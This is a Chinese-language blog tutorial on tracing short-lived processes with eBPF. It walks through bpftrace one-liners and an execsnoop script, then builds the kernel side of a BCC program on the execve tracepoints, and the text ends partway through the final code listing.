class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    int fd</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line">    int flags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_exit_execveat返回值</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>从输出中可以看到，<code>sys_enter_execveat()</code>  比  <code>sys_enter_execve()</code>  多了两个参数，而文件名  <code>filename</code>、命令行选项  <code>argv</code>  以及返回值  ret 的定义都是一样的。</p><p>到这里，我带你使用 bpftrace 查询到了 execve 相关的跟踪点，以及这些跟踪点的具体格式。接下来，为了帮你全方位掌握 eBPF 程序的开发过程，我会以 bpftrace、BCC 和 libbpf 这三种方式为例，带你开发一个跟踪短时进程的 eBPF 程序。这三种方式各有优缺点，在实际的生产环境中都有大量的应用：</p><ul><li><strong>bpftrace 通常用在快速排查和定位系统上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序</strong>。不过，bpftrace 的功能有限，不支持特别复杂的 eBPF 程序，也依赖于 BCC 和 LLVM 动态编译执行。</li><li><strong>BCC 通常用在开发复杂的 eBPF 程序中，其内置的各种小工具也是目前应用最为广泛的 eBPF 小程序</strong>。不过，BCC 也不是完美的，它依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序。</li><li><strong>libbpf 是从内核中抽离出来的标准库，用它开发的 eBPF 程序可以直接分发执行，这样就不需要每台机器都安装 LLVM 和内核头文件了</strong>。不过，它要求内核开启 BTF 特性，需要非常新的发行版才会默认开启（如 RHEL 8.2+ 和 Ubuntu 20.10+ 等）。</li></ul><p>在实际应用中，你可以根据你的内核版本、内核配置、eBPF 程序复杂度，以及是否允许安装内核头文件和 LLVM 等编译工具等，来选择最合适的方案。</p><h3 id="bpftrace-方法"><a href="#bpftrace-方法" class="headerlink" title="bpftrace 方法"></a>bpftrace 方法</h3><p>这一讲我们先来看看，如何使用 bpftrace 来跟踪短时进程。</p><p>由于 <code>execve()</code> 和 <code>execveat()</code> 这两个系统调用的入口参数文件名 <code>filename</code> 和命令行选项 <code>argv</code> ，以及返回值  ret  的定义都是一样的，因而我们可以把这两个跟踪点放到一起来处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123; printf(&quot;%-6d %-8s&quot;, pid, comm); join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpftraceTwoProcess.png" class><p>这个命令中的具体内容含义如下：</p><ul><li><code>bpftrace -e</code>  表示直接从后面的字符串参数中读入 bpftrace 程序（除此之外，它还支持从文件中读入 bpftrace 程序）；</li><li><code>tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat</code>  表示用逗号分隔的多个跟踪点，其后的中括号表示跟踪点的处理函数；</li><li><code>printf()</code> 表示向终端中打印字符串，其用法类似于 C 语言中的 <code>printf()</code> 函数；</li><li><code>pid</code> 和 <code>comm</code> 是 bpftrace 内置的变量，分别表示进程 PID 和进程名称（你可以在其官方文档中找到其他的内置变量）；</li><li><code>join(args-&gt;argv)</code> 表示把字符串数组格式的参数用空格拼接起来，再打印到终端中。对于跟踪点来说，你可以使用  <code>args-&gt;参数名</code>  的方式直接读取参数（比如这里的 <code>args-&gt;argv</code> 就是读取系统调用中的 <code>argv</code> 参数）。</li></ul><p>在另一个终端中执行 ls 命令，然后你会在第一个终端中看到如下的输出：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/lsCommand.png" class><p>一个最简单的思路就是在系统调用的入口把参数保存到 BPF 映射中，然后再在系统调用出口获取返回值后一起输出。比如，你可以尝试执行下面的命令，把新进程的参数存入哈希映射中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中，tid表示线程ID，@execs[tid]表示创建一个哈希映射</span></span><br><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[tid] = join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>很遗憾，这条命令并不能正常运行。根据下面的错误信息，你可以发现，<code>join()</code> 这个内置函数没有返回字符串，不能用来赋值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdin:1:90-106: ERROR: <span class="built_in">join</span>() should not be used <span class="keyword">in</span> an assignment or as a map key</span><br><span class="line">tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[1] = <span class="built_in">join</span>(args-&gt;argv);&#125;</span><br></pre></td></tr></table></figure><p>实际上，在 bpftrace 的 GitHub 页面上，已经有其他用户汇报了同样的问题，并且到现在还是没有解决。</p><p>bpftrace 本身并不适用于所有的 eBPF 应用。如果是复杂的应用，我还是推荐使用 BCC 或者 libbpf 开发。</p><p>再举一用例，在解决短时进程引发的性能问题时，找出短时进程才是最重要的。至于短时进程的执行结果，我们一般可以通过日志看到详细的运行过程。</p><p>不过，这个跟踪程序还是有一些比较大的限制，比如：</p><ul><li>没有输出时间戳，这样去大量日志里面定位问题就比较困难；</li><li>没有父进程 PID，还需要一些额外的工具或经验，才可以找出父进程。</li></ul><p>那么，这些问题该如何解决呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">---------------- execsnoop.bt -----------------</span><br><span class="line"></span><br><span class="line">#!/usr/bin/bpftrace</span><br><span class="line"></span><br><span class="line">#include &lt;linux/sched.h&gt;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%-9s %-6s %-6s %-16s %s\n&quot;, &quot;TIME&quot;, &quot;PID&quot;, &quot;PPID&quot;, &quot;COMM&quot;, &quot;ARGS&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_execve,</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">&#123;</span><br><span class="line">    $task = (struct task_struct *)curtask;</span><br><span class="line"></span><br><span class="line">    time(&quot;%H:%M:%S  &quot;);</span><br><span class="line">    printf(&quot;%-6d %-6d %-16s&quot;, pid, $task-&gt;parent-&gt;tgid, comm);</span><br><span class="line">    join(args-&gt;argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bpftrace-小结"><a href="#bpftrace-小结" class="headerlink" title="bpftrace 小结"></a>bpftrace 小结</h3><p>今天，我带你梳理了查询 eBPF 跟踪点的常用方法，并以短时进程的跟踪为例，通过 bpftrace 实现了短时进程的跟踪程序。</p><p>在跟踪内核时，你要记得，所有的内核跟踪都是被内核函数、内核跟踪点或性能事件等事件源触发后才执行的。所以，在跟踪内核之前，我们就需要通过调试信息、perf、bpftrace 等，找到这些事件源，然后再利用 eBPF 提供的强大功能去跟踪这些事件的执行过程。</p><p>bpftrace 是一个使用最为简单的 eBPF 工具，因此在初学 eBPF 时，建议你可以从它开始。bpftrace 提供了一个简单的脚本语言，只需要简单的几条脚本就可以实现很丰富的 eBPF 程序。它通常用在快速排查和定位系统上，并支持用单行脚本的方式来快速开发并执行一个 eBPF 程序。</p><h2 id="BCC-开发内核追踪程序"><a href="#BCC-开发内核追踪程序" class="headerlink" title="BCC 开发内核追踪程序"></a>BCC 开发内核追踪程序</h2><h3 id="BCC-方法"><a href="#BCC-方法" class="headerlink" title="BCC 方法"></a>BCC 方法</h3><p>我们先来看看如何使用 BCC 来开发上一讲中短时进程的跟踪程序。这里先说明下，由于  <code>execveat</code>  的处理逻辑同  <code>execve</code>  基本相同，限于篇幅的长度，接下来的 BCC 和 libbpf 程序都以  <code>execve</code>  为例。</p><p>这里先回顾一下之前的内容，使用 BCC 开发 eBPF 程序包含两部分</p><ul><li>第一部分是用 C 语言开发的 eBPF 程序。在 eBPF 程序中，你可以利用 BCC 提供的库函数和宏定义简化你的处理逻辑。</li><li>第二部分是用 Python 语言开发的前端界面，其中包含 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等部分。在前端程序中，你同样可以利用 BCC 库来访问 BPF 映射。</li></ul><h3 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h3><p>我们先看第一部分。为了在系统调用入口跟踪点和出口跟踪点间共享进程信息等数据，我们可以定义一个哈希映射（比如命名为  <code>tasks</code>）；同样地，因为我们想要在用户空间实时获取跟踪信息，这就需要一个性能事件映射。对于这两种映射的创建步骤，BCC 已经提供了非常方便的宏定义，你可以直接使用。</p><p>比如，你可以用下面的方式来创建这两个映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    u32 pid;</span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br></pre></td></tr></table></figure><p>代码中指令的具体作用如下：</p><ul><li><code>struct data_t</code>  定义了一个包含进程基本信息的数据结构，它将用在哈希映射的值中（其中的参数大小  <code>args_size</code>  会在读取参数内容的时候用到）；</li><li><code>BPF_PERF_OUTPUT(events)</code>  定义了一个性能事件映射；</li><li><code>BPF_HASH(tasks, u32, struct data_t)</code>  定义了一个哈希映射，其键为 32 位的进程 PID，而值则是进程基本信息  <code>data_t</code>。</li></ul><p>两个映射定义好之后，接下来就是<strong>定义跟踪点的处理函数</strong>。在 BCC 中，你可以通过  <code>TRACEPOINT_PROBE(category, event)</code>  来定义一个跟踪点处理函数。BCC 会将所有的参数放入  <code>args</code>  这个变量中，这样使用  <code>args-&gt;&lt;参数名&gt;</code>  就可以访问跟踪点的参数值。</p><p>对我们要跟踪的短时进程问题来说，也就是下面这两个跟踪点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义sys_enter_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//待添加处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义sys_exit_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//待添加处理逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="入口跟踪点处理"><a href="#入口跟踪点处理" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点  <code>sys_enter_execve</code>  的处理，还是按照上一讲中 bpftrace 的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。</p><p>其中，进程 PID 和进程名称都比较容易获取。如下面的代码所示，你可以调用  <code>bpf_get_current_pid_tgid()</code>  查询进程 PID，调用  <code>bpf_get_current_comm()</code>  读取进程名称：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取进程PID和进程名称</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();  <span class="comment">// 取低32位为进程PID</span></span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br></pre></td></tr></table></figure><p>而命令行参数的获取就没那么容易了。因为 BCC 把所有参数都放到了  <code>args</code>  中，你可以使用  <code>args-&gt;argv</code>  来访问参数列表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br></pre></td></tr></table></figure><p>注意，<code>argv</code>  是一个用户空间的字符串数组（指针数组），这就需要调用  <code>bpf_probe_read</code> 系列的辅助函数，去这些指针中读取数据。并且，字符串的数量（即参数的个数）和每个字符串的长度（即每个参数的长度）都是未知的，由于 eBPF 栈大小只有 512 字节，如果想要把它们读入一个临时的字符数组中，必须要保证每次读取的内容不超过栈的大小。这类问题有很多种不同的处理方法，其中一个比较简单的方式就是<strong>把多余的参数截断，使用<code>...</code>代替过长的参数</strong>。一般来说，知道了进程的名称和前几个参数，对调试和排错来说就足够了。</p><p>你可以定义最大读取的参数个数和参数长度，然后在哈希映射的值中定义一个字符数组，代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义参数长度和参数个数常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有了字符数组，接下来再定义一个辅助函数，从参数数组中读取字符串参数（限定最长  <code>ARGSIZE</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从用户空间读取字符串</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> *data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE, (<span class="type">void</span> *)ptr);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line">    <span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">    data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中，有几点需要你注意：</p><ul><li><code>bpf_probe_read_user_str()</code>  返回的是包含字符串结束符 <code>\0</code> 的长度。为了拼接所有的字符串，在计算已读取参数长度的时候，需要把 <code>\0</code> 排除在外。</li><li><code>&amp;data-&gt;argv[data-&gt;args_size]</code>  用来获取要存放参数的位置指针，这是为了把多个参数拼接到一起。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考<a class="link" href="https://sysdig.com/blog/the-art-of-writing-ebpf-programs-a-primer/">这篇文章<i class="fas fa-external-link-alt"></i></a>，了解更多的内存访问验证细节）。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考这篇文章，了解更多的内存访问验证细节）。</li></ul><p>有了这个辅助函数之后，因为 eBPF 在老版本内核中并不支持循环（有界循环在 5.3 之后才支持），要访问字符串数组，还需要一个小技巧：使用 <code>#pragma unroll</code> 告诉编译器，把源码中的循环自动展开。这就避免了最终的字节码中包含循环。</p><p>完整的处理函数如下所示（具体的每一步我都加了详细的注释，你可以参考注释来加深理解）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入内核头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义sys_enter_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程PID和进程名称</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个参数（即可执行文件的名字）</span></span><br><span class="line">    <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取其他参数（限定最多5个）</span></span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">    <span class="comment">// 存储到哈希映射中</span></span><br><span class="line">    tasks.update(&amp;pid, &amp;data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，为了获取内核数据结构的定义，在文件的开头需要引入相关的内核头文件。此外，读取参数完成之后，不要忘记调用 <code>tasks.update()</code> 把进程的基本信息存储到哈希映射中。因为返回值需要等到出口跟踪点时才可以获取，这儿只需要更新哈希映射就可以了，不需要把进程信息提交到性能事件映射中去。</p><h3 id="出口跟踪点处理"><a href="#出口跟踪点处理" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点  <code>sys_enter_execve</code>  处理好之后，我们再来看看出口跟踪点  <code>sys_exit_execve</code>  该如何处理。</p><p>由于进程的基本信息已经保存在了哈希映射中，所以出口事件的处理可以分为查询进程基本信息、填充返回值、最后再提交到性能事件映射这三个步骤。具体代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义sys_exit_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从哈希映射中查询进程基本信息</span></span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填充返回值并提交到性能事件映射中</span></span><br><span class="line">    <span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        data-&gt;retval = args-&gt;ret;</span><br><span class="line">        events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后清理进程信息</span></span><br><span class="line">        tasks.delete(&amp;pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，完整的 eBPF 程序就开发好了，你可以把上述的代码保存到一个本地文件中，并命名为  <code>execsnoop.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tracing execve system call. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// consts for arguments (ensure below stack size limit 512)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_ARG (FULL_MAX_ARGS_ARR - ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// perf event map (sharing data to userspace) and hash map (sharing data between tracepoints)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line"><span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// helper function to read string from userspace.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> *data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE,</span><br><span class="line">  (<span class="type">void</span> *)ptr);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line"><span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execve tracepoint.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// variables definitions</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span 